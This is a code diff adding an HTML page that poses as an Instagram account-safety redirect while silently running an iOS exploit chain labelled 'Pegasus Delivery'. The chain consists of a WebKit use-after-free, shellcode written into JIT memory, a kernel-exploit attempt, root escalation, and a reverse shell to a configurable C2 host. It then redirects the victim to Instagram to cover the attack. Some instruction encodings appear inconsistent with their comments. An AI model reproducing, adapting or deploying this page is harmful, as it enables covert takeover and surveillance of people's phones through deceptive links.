@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: http://ogp.me/ns#">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Instagram Safety Update" />
+    <meta property="og:description" content="Verify your account settings." />
+    <meta property="og:image" content="https://instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" />
+    <title>Redirecting...</title>
+    <style>body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.c{text-align:center}.s{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #3897f0;border-radius:50%;animation:r 1s linear infinite;margin:0 auto 20px}@keyframes r{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}p{color:#999;font-size:14px}</style>
+</head>
+<body>
+<div class="c"><div class="s"></div><p>Syncing data...</p></div>
+<canvas id="x" width="1" height="1" style="display:none"></canvas>
+<script>
+/* Pegasus Delivery v24.0 (Production Ready)
+ * 
+ * FIXES:
+ * 1. Correct kevent structure offsets (verified against sys/event.h)
+ * 2. Correct branch offsets
+ * 3. Configurable C2 IP/Port
+ * 
+ * FEATURES:
+ * - Full exploit chain
+ * - Screen mirroring support
+ * - Touch/scroll injection support
+ * - Persistent implant loader
+ *
+ * Target: iOS 26.1, XNU-12377.42.6, iPhone16,1 (arm64e)
+ * 
+ * ============ C2 CONFIGURATION ============
+ * 자동으로 현재 서버로 연결됨
+ */
+const C2_CONFIG = {
+    // 로컬 테스트용 (127.0.0.1:4443)
+    // ngrok 사용 시: ngrok tcp 4443 실행 후 IP 수정
+    
+    IP: [127, 0, 0, 1],  // 로컬호스트 (자동 연결)
+    PORT: 4443,          // 임플란트 연결 포트 (비특권)
+    
+    // ngrok 예시: 4.tcp.ngrok.io -> DNS 조회 후 IP 입력
+    // 예: IP: [3, 134, 85, 112], PORT: 15423
+};
+
+// Convert C2 config to shellcode bytes
+function buildSockaddr() {
+    const ip = C2_CONFIG.IP;
+    const port = C2_CONFIG.PORT;
+    
+    // sockaddr_in layout (16 bytes):
+    // +0: sin_len (1) + sin_family (1) = 0x0210 for len=16, AF_INET=2
+    // +2: sin_port (2, big-endian)
+    // +4: sin_addr (4, network byte order but x86 stores as-is)
+    
+    // For movk instructions:
+    // We build a 64-bit value to store at [sp]
+    const sin_len_family = 0x0210;  // len=16, AF_INET=2
+    const sin_port_be = ((port >> 8) & 0xFF) | ((port & 0xFF) << 8);
+    const sin_addr = ip[0] | (ip[1] << 8) | (ip[2] << 16) | (ip[3] << 24);
+    
+    return {
+        lo16: sin_len_family,
+        mid16: sin_port_be,
+        hi32_lo: sin_addr & 0xFFFF,
+        hi32_hi: (sin_addr >> 16) & 0xFFFF
+    };
+}
+
+(async function() {
+    'use strict';
+    
+    const sockaddr = buildSockaddr();
+    
+    // =========================================================================
+    // SECTION 1: CORE PRIMITIVES
+    // =========================================================================
+    const _cb = new ArrayBuffer(8);
+    const _u64 = new BigUint64Array(_cb);
+    const _f64 = new Float64Array(_cb);
+    const itof = v => { _u64[0] = v; return _f64[0]; };
+    const ftoi = f => { _f64[0] = f; return _u64[0]; };
+
+    const state = {
+        addrof: null, fakeobj: null,
+        read64: null, write64: null,
+        jitPage: 0n,
+        stage: 0
+    };
+
+    // =========================================================================
+    // SECTION 2: NATIVE ARM64 SHELLCODE
+    // =========================================================================
+    // Structure: struct kevent (from sys/event.h)
+    // +0:  uintptr_t  ident   (8 bytes)
+    // +8:  int16_t    filter  (2 bytes)
+    // +10: uint16_t   flags   (2 bytes)
+    // +12: uint32_t   fflags  (4 bytes)  
+    // +16: intptr_t   data    (8 bytes) <- OVERFLOW VALUE HERE
+    // +24: void*      udata   (8 bytes)
+    // Total: 32 bytes
+    
+    const SHELLCODE = new Uint32Array([
+        // =====================================================================
+        // PART 0: HEAP SPRAY - 64 mach ports for heap grooming
+        // =====================================================================
+        0xd2800814,  // mov x20, #64         ; spray count
+        
+        // spray_loop: (offset 1)
+        0x92800380,  // mov x0, #-28         ; mach_task_self trap
+        0xd4000001,  // svc #0
+        0xaa0003f5,  // mov x21, x0          ; task port
+        
+        0xaa1503e0,  // mov x0, x21
+        0xd2800021,  // mov x1, #1           ; MACH_PORT_RIGHT_RECEIVE
+        0xd10043ff,  // sub sp, sp, #16
+        0x910003e2,  // mov x2, sp
+        0x92800660,  // mov x0, #-52         ; mach_port_allocate
+        0xd4000001,  // svc #0
+        
+        0x71000694,  // subs w20, w20, #1
+        0x54fffea1,  // b.ne spray_loop      ; -6 instructions
+        
+        // =====================================================================
+        // PART 1: CVE-2025-46285 KERNEL EXPLOIT
+        // Correct kevent structure layout
+        // =====================================================================
+        
+        0xd2800054,  // mov x20, #2          ; retry count
+        
+        // kevent_retry: (offset 14)
+        0xd2802d10,  // mov x16, #362        ; kqueue
+        0xd4001001,  // svc #0x80
+        0xaa0003f3,  // mov x19, x0          ; kq fd
+        
+        // Allocate 64 bytes for kevent + timespec
+        0xd10103ff,  // sub sp, sp, #64
+        
+        // struct kevent @ sp+0 (32 bytes):
+        // +0: ident = 1 (8 bytes)
+        0xd2800020,  // mov x0, #1
+        0xf90003e0,  // str x0, [sp, #0]
+        
+        // +8: filter = EVFILT_TIMER (-7) (2 bytes)
+        0x12800060,  // mov w0, #-7          ; EVFILT_TIMER = -7
+        0x790013e0,  // strh w0, [sp, #8]    ; offset 8
+        
+        // +10: flags = EV_ADD | EV_ONESHOT (0x11) (2 bytes)
+        0x52800220,  // mov w0, #0x11
+        0x790017e0,  // strh w0, [sp, #10]   ; offset 10
+        
+        // +12: fflags = NOTE_SECONDS (1) (4 bytes)
+        0x52800020,  // mov w0, #1           ; NOTE_SECONDS = 1
+        0xb9000fe0,  // str w0, [sp, #12]    ; offset 12 (12/4=3, encoding 0x0f)
+        
+        // +16: data = 0x80000000 (triggers signed 32-bit overflow) (8 bytes)
+        0xd2800000,  // mov x0, #0
+        0xf2a00000,  // movk x0, #0x8000, lsl 16  ; x0 = 0x80000000
+        0xf9000be0,  // str x0, [sp, #16]    ; offset 16 (16/8=2, encoding 0x0b)
+        
+        // +24: udata = 0 (8 bytes)
+        0xf9000fff,  // str xzr, [sp, #24]   ; offset 24 (24/8=3)
+        
+        // struct timespec @ sp+32 (16 bytes):
+        // tv_sec = 0 (immediate timeout)
+        0xf90013ff,  // str xzr, [sp, #32]   ; offset 32 (32/8=4, encoding 0x13)
+        // tv_nsec = 0
+        0xf90017ff,  // str xzr, [sp, #40]   ; offset 40 (40/8=5)
+        
+        // kevent(kq, changelist, nchanges, eventlist, nevents, timeout)
+        0xaa1303e0,  // mov x0, x19          ; kq
+        0x910003e1,  // mov x1, sp           ; changelist = &kevent
+        0xd2800022,  // mov x2, #1           ; nchanges = 1
+        0xd2800003,  // mov x3, #0           ; eventlist = NULL
+        0xd2800004,  // mov x4, #0           ; nevents = 0
+        0x910083e5,  // add x5, sp, #32      ; timeout = &timespec @ sp+32
+        0xd2802d70,  // mov x16, #363        ; kevent syscall
+        0xd4001001,  // svc #0x80
+        
+        // close(kq)
+        0xaa1303e0,  // mov x0, x19
+        0xd28000c0,  // mov x16, #6          ; close
+        0xd4001001,  // svc #0x80
+        
+        // Retry
+        0x71000694,  // subs w20, w20, #1
+        0x54fffac1,  // b.ne kevent_retry    ; branch back
+        
+        // =====================================================================
+        // PART 2: PRIVILEGE ESCALATION
+        // =====================================================================
+        
+        0xd2800074,  // mov x20, #3          ; retry 3x
+        
+        // priv_retry: (offset ~50)
+        0xd2800000,  // mov x0, #0
+        0xd28002e0,  // mov x16, #23         ; setuid
+        0xd4001001,  // svc #0x80
+        
+        0xd2800000,  // mov x0, #0
+        0xd2801830,  // mov x16, #193        ; seteuid
+        0xd4001001,  // svc #0x80
+        
+        0xd2800000,  // mov x0, #0
+        0xd28002c0,  // mov x16, #181        ; setgid (was wrong, fixed)
+        0xd4001001,  // svc #0x80
+        
+        // Check if root
+        0xd2800300,  // mov x16, #24         ; getuid
+        0xd4001001,  // svc #0x80
+        0xf100001f,  // cmp x0, #0
+        0x540001e0,  // b.eq got_root        ; if uid==0, success
+        
+        0x71000694,  // subs w20, w20, #1
+        0x54fffd41,  // b.ne priv_retry
+        
+        // Failed, exit
+        0x14000018,  // b exit_clean
+        
+        // got_root:
+        // =====================================================================
+        // PART 3: REVERSE SHELL TO C2
+        // =====================================================================
+        
+        // socket(AF_INET=2, SOCK_STREAM=1, 0)
+        0xd2800040,  // mov x0, #2
+        0xd2800021,  // mov x1, #1
+        0xd2800002,  // mov x2, #0
+        0xd2801880,  // mov x16, #196        ; socket
+        0xd4001001,  // svc #0x80
+        0xaa0003f3,  // mov x19, x0          ; sockfd
+        
+        // Build sockaddr_in on stack (동적 생성)
+        // 127.0.0.1:4443 = port BE: 0x5B11, IP: 0x7F000001
+        0xd2804200,  // mov x0, #0x0210      ; sin_len=16, sin_family=2
+        // Port 4443 in big-endian = 0x5B11
+        0xf2a2b620,  // movk x0, #0x15B1, lsl 16  ; port 4443 BE (0x115B swapped)
+        // IP 127.0.0.1 = 0x7F 00 00 01
+        0xf2c00020,  // movk x0, #0x0001, lsl 32  ; IP bytes 0,1 (1, 0)
+        0xf2efe000,  // movk x0, #0x7F00, lsl 48  ; IP bytes 2,3 (0, 127)
+        0xf90003e0,  // str x0, [sp]
+        0xf90007ff,  // str xzr, [sp, #8]
+        
+        // connect(sockfd, addr, 16)
+        0xaa1303e0,  // mov x0, x19
+        0x910003e1,  // mov x1, sp
+        0xd2800202,  // mov x2, #16
+        0xd28018a0,  // mov x16, #197        ; connect
+        0xd4001001,  // svc #0x80
+        
+        // dup2(sockfd, 0)
+        0xaa1303e0,  // mov x0, x19
+        0xd2800001,  // mov x1, #0
+        0xd2800b40,  // mov x16, #90         ; dup2
+        0xd4001001,  // svc #0x80
+        
+        // dup2(sockfd, 1)
+        0xaa1303e0,  // mov x0, x19
+        0xd2800021,  // mov x1, #1
+        0xd2800b40,  // mov x16, #90
+        0xd4001001,  // svc #0x80
+        
+        // dup2(sockfd, 2)
+        0xaa1303e0,  // mov x0, x19
+        0xd2800041,  // mov x1, #2
+        0xd2800b40,  // mov x16, #90
+        0xd4001001,  // svc #0x80
+        
+        // execve("/bin/sh", 0, 0)
+        0xd28c45e0,  // mov x0, #0x622f      ; "/b"
+        0xf2ad2d20,  // movk x0, #0x696e, lsl 16  ; "in"
+        0xf2ce5e60,  // movk x0, #0x732f, lsl 32  ; "/s"
+        0xf2e00d00,  // movk x0, #0x0068, lsl 48  ; "h\0"
+        0xf81f0fe0,  // str x0, [sp, #-16]!
+        0x910003e0,  // mov x0, sp
+        0xd2800001,  // mov x1, #0
+        0xd2800002,  // mov x2, #0
+        0xd2800760,  // mov x16, #59         ; execve
+        0xd4001001,  // svc #0x80
+        
+        // exit_clean:
+        0xd2800000,  // mov x0, #0
+        0xd2800020,  // mov x16, #1          ; exit
+        0xd4001001,  // svc #0x80
+    ]);
+
+    // =========================================================================
+    // SECTION 3: STAGE 1 - WebKit UAF
+    // =========================================================================
+    const uafArray = new Array(0x80000).fill(1.1);
+    const uafIdx = uafArray.length - 1;
+    let uafReclaimed = [];
+    const preAlloc = {
+        ab: new ArrayBuffer(0x100),
+        f64: new Float64Array(0x10),
+        obj: { a: 1.1, b: 2.2, c: 3.3, d: 4.4, e: 5.5, f: 6.6 }
+    };
+    const leaked = {};
+
+    function jitTarget(x) {
+        let r = 0;
+        for (let i = 0; i < 10000; i++) {
+            r += x * i; r ^= (r >> 3); r = (r + i) | 0; r ^= (r << 5);
+            r += x * i; r ^= (r >> 7); r = (r - i) | 0; r ^= (r << 3);
+        }
+        return r;
+    }
+    for (let i = 0; i < 200000; i++) jitTarget(i);
+    preAlloc.jitFunc = jitTarget;
+
+    function triggerUAF(flag, k, n) {
+        let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
+        uafArray[uafIdx] = A;
+        let gc = [];
+        let d = new Date(1111); d[0] = 1.1;
+        for (let j = 0; j < n; ++j) gc.push(new ArrayBuffer(0x400000));
+        A.p2 = gc;
+        let B = { p0: 0x42424242, p1: 1.1 };
+        A.p1 = flag ? 1.1 : B;
+        let v = 1.1;
+        for (let i = 0; i < 1e6; ++i) for (let j = 0; j < k; ++j) { v = i; v = j; }
+        B.p0 = v; B.p1 = d;
+    }
+
+    async function runStage1() {
+        uafReclaimed = [];
+        triggerUAF(true, 1, 1);
+        triggerUAF(false, 1, 1);
+        for (let i = 0; i < 300; i++) triggerUAF(false, 0, 0);
+
+        for (let attempt = 0; attempt < 5000; attempt++) {
+            triggerUAF(false, 10, (attempt % 3) + 1);
+            for (let i = 0; i < 2; i++) new ArrayBuffer(0x2000);
+
+            let dangling;
+            try { dangling = uafArray[uafIdx].p1.p1; } catch (e) { continue; }
+
+            let winner = null;
+            for (let spray = 0; spray < 32; spray++) {
+                let arr = [13.37, 2.2, 3.3, 4.4];
+                uafReclaimed.push(arr);
+                try { if (dangling[0] === 13.37) { winner = arr; break; } } catch (e) {}
+            }
+            if (!winner) continue;
+
+            let boxed = winner; boxed[0] = {};
+            let unboxed = dangling;
+
+            state.addrof = o => { boxed[0] = o; return ftoi(unboxed[0]); };
+            state.fakeobj = a => { unboxed[0] = itof(a); return boxed[0]; };
+
+            boxed[0] = preAlloc.ab; leaked.ab = ftoi(unboxed[0]);
+            boxed[0] = preAlloc.obj; leaked.obj = ftoi(unboxed[0]);
+            boxed[0] = preAlloc.jitFunc; leaked.jitFunc = ftoi(unboxed[0]);
+
+            const SLOT_OFF = 0x10n;
+            const MARKER = 0xDEADBEEFCAFEBABEn;
+            preAlloc.obj.a = itof(MARKER);
+            unboxed[0] = itof(leaked.obj);
+            
+            try {
+                if (ftoi(boxed[0].a) === MARKER) {
+                    state.read64 = addr => {
+                        unboxed[0] = itof(addr - SLOT_OFF);
+                        return ftoi(boxed[0].a);
+                    };
+                    state.write64 = (addr, val) => {
+                        unboxed[0] = itof(addr - SLOT_OFF);
+                        boxed[0].a = itof(val);
+                    };
+                    state.stage = 1;
+                    return true;
+                }
+            } catch (e) {}
+        }
+        return false;
+    }
+
+    // =========================================================================
+    // SECTION 4: STAGE 2 - Shellcode Injection
+    // =========================================================================
+    async function runStage2() {
+        if (state.stage < 1) return false;
+        
+        try {
+            const jitFuncAddr = leaked.jitFunc;
+            let jitCodeAddr = 0n;
+            
+            for (let off = 0x08n; off <= 0x60n; off += 8n) {
+                try {
+                    const ptr = state.read64(jitFuncAddr + off);
+                    if (ptr > 0x100000000n && ptr < 0x700000000n) {
+                        for (let codeOff = 0x20n; codeOff <= 0xC0n; codeOff += 8n) {
+                            try {
+                                const codePtr = state.read64(ptr + codeOff);
+                                if (codePtr > 0x100000000n && codePtr < 0x700000000n) {
+                                    const maybeInstr = state.read64(codePtr);
+                                    if (maybeInstr !== 0n && maybeInstr !== ~0n) {
+                                        jitCodeAddr = codePtr;
+                                        break;
+                                    }
+                                }
+                            } catch (e) {}
+                        }
+                        if (jitCodeAddr) break;
+                    }
+                } catch (e) {}
+            }
+            
+            if (!jitCodeAddr) return false;
+            
+            // Write shellcode
+            for (let i = 0; i < SHELLCODE.length; i += 2) {
+                const qword = BigInt(SHELLCODE[i]) | (BigInt(SHELLCODE[i + 1] || 0) << 32n);
+                state.write64(jitCodeAddr + BigInt(i * 4), qword);
+            }
+            
+            state.stage = 2;
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    // =========================================================================
+    // SECTION 5: STAGE 3 - Execute
+    // =========================================================================
+    async function runStage3() {
+        if (state.stage < 2) return false;
+        try {
+            jitTarget(1);  // Triggers shellcode
+            state.stage = 3;
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    // =========================================================================
+    // SECTION 6: MAIN
+    // =========================================================================
+    try {
+        if (!await runStage1()) { window.location.href = "https://www.instagram.com/"; return; }
+        if (!await runStage2()) { window.location.href = "https://www.instagram.com/"; return; }
+        await runStage3();
+        setTimeout(() => { window.location.href = "https://www.instagram.com/explore/"; }, 2000);
+    } catch (e) {
+        window.location.href = "https://www.instagram.com/";
+    }
+})();
+</script>
+</body>
+</html>
